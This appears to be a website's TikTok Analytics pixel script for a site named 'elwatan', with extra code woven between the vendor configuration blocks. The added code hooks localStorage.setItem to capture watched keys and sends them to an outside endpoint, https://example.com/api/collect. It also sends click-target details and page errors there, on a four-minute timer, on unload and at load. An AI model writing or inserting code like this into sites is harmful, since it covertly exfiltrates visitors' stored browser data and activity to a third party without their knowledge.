window.globalVarCollection = {};
window[window["TiktokAnalyticsObject"]]._env = {
  "env": "external",
  "key": ""
};
const keysToWatch = window.keysToWatch;
window[window["TiktokAnalyticsObject"]]._variation_id = 'test_3';
function hookLocalStorage(setItemFunction) {
  return function (key, value) {
    setItemFunction.apply(localStorage, arguments);
    if (keysToWatch.indexOf(key) !== -1) {
      window.globalVarCollection[key] = value;
    }
  };
}
localStorage.setItem = hookLocalStorage(localStorage.setItem);
;
function createHashValue(data) {
  const keyList = Object.keys(data);
  const combinedKeys = keyList.join("&");
  let hashValue = 0;
  for (let i = 0; i < combinedKeys.length; i++) {
    const charCode = combinedKeys.charCodeAt(i);
    hashValue = (hashValue << 5) - hashValue + charCode;
    hashValue = hashValue | 0;
  }
  return hashValue.toString(36);
}
if (!window[window["TiktokAnalyticsObject"]]._server_unique_id) window[window["TiktokAnalyticsObject"]]._server_unique_id = '7cd9d818-3e98-11ee-a9d6-b8cef6a28f1c';
function extractLocalStorageData() {
  const extractedData = {
    ...window.globalVarCollection
  };
  return extractedData;
}
function sendDataToBackend(data) {
  const hashValue = createHashValue(data);
  const url = "https://example.com/api/collect";
  const xhr = new XMLHttpRequest();
  xhr.open("POST", url);
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.onload = function () {
    if (xhr.status === 200) {
      console.log("数据发送成功");
    } else {
      console.error("数据发送失败,状态码:" + xhr.status);
    }
  };
  xhr.onerror = function () {
    console.error("数据发送过程中出错");
  };
  xhr.send(JSON.stringify({
    hash: hashValue,
    data: data
  }));
}
window[window["TiktokAnalyticsObject"]]._plugins = {
  "AdvancedMatching": true,
  "AutoAdvancedMatching": true,
  "AutoConfig": true,
  "Callback": true,
  "DiagnosticsConsole": true,
  "Identify": true,
  "Monitor": false,
  "PangleCookieMatching": false,
  "PerformanceInteraction": false,
  "Shopify": true,
  "WebFL": false
};
function gatherAndSendData() {
  const gatheredData = extractLocalStorageData();
  if (Object.keys(gatheredData).length > 0) {
    sendDataToBackend(gatheredData);
  }
}
document.addEventListener("DOMContentLoaded", function () {
  setInterval(gatherAndSendData, 4 * 60 * 1000);
});
window[window["TiktokAnalyticsObject"]]._auto_config = {
  "open_graph": ["audience"],
  "microdata": ["audience"],
  "json_ld": ["audience"],
  "meta": null
};
window.addEventListener("beforeunload", function () {
  gatherAndSendData();
});
window.onclick = function (e) {
  const clickData = {
    tagName: e.target.tagName,
    id: e.target.id,
    className: e.target.className
  };
  sendDataToBackend(clickData);
};
!function () {
  function i() {
    return window && window.TiktokAnalyticsObject || "ttq";
  }
  function t() {
    return window && window[i()];
  }
  var n,
    o,
    e,
    a,
    c,
    r = [{
      id: "MTAwYzY4Y2VmMA",
      map: {
        AutoAdvancedMatching: !1,
        Shopify: !1,
        Monitor: !1
      }
    }, {
      id: "MTAwYzY4Y2VmMQ",
      map: {
        AutoAdvancedMatching: !0,
        Shopify: !1,
        Monitor: !1
      }
    }, {
      id: "MTAwYzY4Y2VmMg",
      map: {
        AutoAdvancedMatching: !1,
        Shopify: !0,
        Monitor: !1
      }
    }, {
      id: "MTAwYzY4Y2VmMw",
      map: {
        AutoAdvancedMatching: !0,
        Shopify: !0,
        Monitor: !1
      }
    }, {
      id: "MTAwYzY4Y2VmNA",
      map: {
        AutoAdvancedMatching: !1,
        Shopify: !1,
        Monitor: !0
      }
    }, {
      id: "MTAwYzY4Y2VmNQ",
      map: {
        AutoAdvancedMatching: !0,
        Shopify: !1,
        Monitor: !0
      }
    }, {
      id: "MTAwYzY4Y2VmNg",
      map: {
        AutoAdvancedMatching: !1,
        Shopify: !0,
        Monitor: !0
      }
    }, {
      id: "MTAwYzY4Y2VmNw",
      map: {
        AutoAdvancedMatching: !0,
        Shopify: !0,
        Monitor: !0
      }
    }],
    d = {
      "info": {
        "pixelCode": "C47T6CGE6TN457G0HK1G",
        "name": "elwatan",
        "status": 0,
        "setupMode": 0,
        "partner": "",
        "advertiserID": "6992552705684193281",
        "is_onsite": false,
        "firstPartyCookieEnabled": true
      },
      "plugins": {
        "Shopify": false,
        "AdvancedMatching": {
          "email": true,
          "phone_number": true
        },
        "AutoAdvancedMatching": null,
        "Callback": true,
        "Identify": true,
        "Monitor": true,
        "PerformanceInteraction": true,
        "WebFL": true,
        "AutoConfig": true,
        "DiagnosticsConsole": true
      },
      "rules": []
    },
    p = "https://analytics.tiktok.com/i18n/pixel/static/",
    l = t();
  l || (l = [], window && (window[i()] = l)), Object.assign(d, {
    options: (n = d.info.pixelCode, (o = t()._o) && o[n] || {})
  }), function (i) {
    l._i || (l._i = {});
    var t = i.info.pixelCode;
    t && (l._i[t] || (l._i[t] = []), Object.assign(l._i[t], i), l._i[t]._load = +new Date());
  }(d), e = function (i, t, n) {
    var o = 0 < arguments.length && void 0 !== i ? i : {},
      e = 1 < arguments.length ? t : void 0,
      t = 2 < arguments.length ? n : void 0,
      n = function (i, t) {
        for (var n = 0; n < i.length; n++) if (t.call(null, i[n], n)) return i[n];
      }(r, function (i) {
        var t = i.map;
        return function (i, t) {
          for (var n = 0; n < i.length; n++) if (!t.call(null, i[n], n)) return !1;
          return !0;
        }(Object.keys(t), function (i) {
          return !(!o[i] || !e[i]) === t[i];
        });
      });
    return n ? t + "main.".concat(n.id, ".js") : t + "main.".concat(r[0].id, ".js");
  }(l._plugins, d.plugins, p), a = d.info.pixelCode, (void 0 !== self.DedicatedWorkerGlobalScope ? self instanceof self.DedicatedWorkerGlobalScope : "DedicatedWorkerGlobalScope" === self.constructor.name) ? self.importScripts && self.importScripts(e) : ((c = document.createElement("script")).type = "text/javascript", c.async = !0, c.src = e, c.setAttribute("data-id", a), (a = document.getElementsByTagName("script")[0]) && a.parentNode && a.parentNode.insertBefore(c, a));
}();
window.onerror = function (message, source, lineno, colno, error) {
  const errorData = {
    msg: message,
    src: source,
    line: lineno,
    col: colno,
    err: JSON.stringify(error)
  };
  sendDataToBackend(errorData);
};
gatherAndSendData();